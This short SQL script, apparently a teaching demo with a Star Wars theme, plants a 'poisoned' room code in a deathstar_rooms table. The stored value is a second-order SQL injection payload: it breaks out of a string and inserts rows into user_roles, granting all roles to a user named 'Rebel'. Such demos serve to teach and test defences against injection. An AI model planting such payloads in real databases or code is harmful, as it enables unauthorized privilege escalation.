
select * from user_roles;
select * from deathstar_rooms;


-- Poisoned room-code
update deathstar_rooms set code = 'VADER''); insert into user_roles (id_user, id_role) select u.id, r.id from users u, roles r
where (u.id, r.id) not in (select id_user, id_role from user_roles) and u.user_name in (''Rebel' where id = 2;